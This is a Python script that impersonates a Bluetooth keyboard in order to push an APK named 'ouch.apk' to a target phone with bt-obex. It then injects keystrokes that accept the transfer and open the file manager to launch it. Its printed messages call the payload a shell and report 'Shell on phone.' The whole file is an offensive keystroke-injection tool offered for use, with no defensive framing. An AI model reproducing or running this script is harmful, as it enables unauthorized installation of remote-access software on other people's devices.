#!/usr/bin/python3

import sys
import os
import time
import multiprocessing
from bthid import BluetoothHIDService
from dbus.mainloop.glib import DBusGMainLoop

#macaddr = "DC:53:60:6C:FC:B3"
pcmacaddr = sys.argv[1]
phmacaddr = sys.argv[2]

def macr(send_call_back):

    def home_scr():
        for _ in range(2):
            kstate = bytearray([0xA1, 0x01, 0x00, 0x00, 0x29, 0x00, 0x00, 0x00, 0x00, 0x00])
            time.sleep(1)
            send_call_back(bytes(kstate))

    def find_scr():
        for _ in range(8):
            kstate = bytearray([0xA1, 0x01, 0x08, 0x00, 0x09, 0x00, 0x00, 0x00, 0x00, 0x00])
            time.sleep(0.3)
            send_call_back(bytes(kstate))

    def kbtab():
        kstate = bytearray([0xA1, 0x01, 0x00, 0x00, 0x2B, 0x00, 0x00, 0x00, 0x00, 0x00])
        send_call_back(bytes(kstate))

    def kbreturn():
        kstate = bytearray([0xA1, 0x01, 0x00, 0x00, 0x28, 0x00, 0x00, 0x00, 0x00, 0x00])
        send_call_back(bytes(kstate))

    def go_back():
        kstate = bytearray([0xA1, 0x01, 0x00, 0x00, 0xF1, 0x00, 0x00, 0x00, 0x00, 0x00])
        send_call_back(bytes(kstate))

    def kbdown():
        kstate = bytearray([0xA1, 0x01, 0x00, 0x00, 0x5B, 0x00, 0x00, 0x00, 0x00, 0x00])
        send_call_back(bytes(kstate))

    def kbright():
        kstate = bytearray([0xA1, 0x01, 0x00, 0x00, 0x4F, 0x00, 0x00, 0x00, 0x00, 0x00])
        send_call_back(bytes(kstate))

    def drop_menu():
        kstate = bytearray([0xA1, 0x01, 0x08, 0x00, 0x11, 0x00, 0x00, 0x00, 0x00, 0x00])
        send_call_back(bytes(kstate))

    def my_files():
        find_scr()
        kstate = bytearray([0xA1, 0x01, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00])
        send_call_back(bytes(kstate))
        kstate = bytearray([0xA1, 0x01, 0x00, 0x00, 0x1C, 0x00, 0x00, 0x00, 0x00, 0x00])
        send_call_back(bytes(kstate))
        kstate = bytearray([0xA1, 0x01, 0x00, 0x00, 0x2C, 0x00, 0x00, 0x00, 0x00, 0x00])
        send_call_back(bytes(kstate))
        kstate = bytearray([0xA1, 0x01, 0x00, 0x00, 0x09, 0x00, 0x00, 0x00, 0x00, 0x00])
        send_call_back(bytes(kstate))
        kstate = bytearray([0xA1, 0x01, 0x00, 0x00, 0x0C, 0x00, 0x00, 0x00, 0x00, 0x00])
        send_call_back(bytes(kstate))
        kstate = bytearray([0xA1, 0x01, 0x00, 0x00, 0x0F, 0x00, 0x00, 0x00, 0x00, 0x00])
        send_call_back(bytes(kstate))
        kstate = bytearray([0xA1, 0x01, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00])
        send_call_back(bytes(kstate))
        kstate = bytearray([0xA1, 0x01, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00, 0x00, 0x00])
        send_call_back(bytes(kstate))

    def sys_run_push():
        return os.system("bt-obex -p " + phmacaddr + " ouch.apk")

    def push_keys():
        time.sleep(2)
        print ("Accepting shell apk...")
        kbdown()
        kbtab()
        kbright()
        time.sleep(0.3)
        for _ in range(10):
            kbreturn()
            kbdown()
            time.sleep(0.8)
        print("Pushing to phone...")
        time.sleep(1)
        if rret is None:
            print("Shit, missed.  Retrying...")
            call_run.start()
        else:
            print("Shell on phone.")


    def find_shell():
        find_scr()
        kbright()
        find_scr()


    call_run = multiprocessing.Process(target=sys_run_push)
    call_keys = multiprocessing.Process(target=push_keys)
    rret = call_run.start()
    maybedo = call_keys.start()
    call_run.join()
    call_keys.join()
    time.sleep(1)
    print("Trying to find shell...")
    home_scr()
    find_shell()
    my_files()
    kbreturn()
    kbdown()
    kbreturn()
    kbreturn()


if __name__ == '__main__':
    DBusGMainLoop(set_as_default=True)
    srec = open("sdp_record_kbd.xml").read()
    try:
        bthid_srv = BluetoothHIDService(srec, pcmacaddr)
        macr(bthid_srv.send)
    finally:
        print("Done")
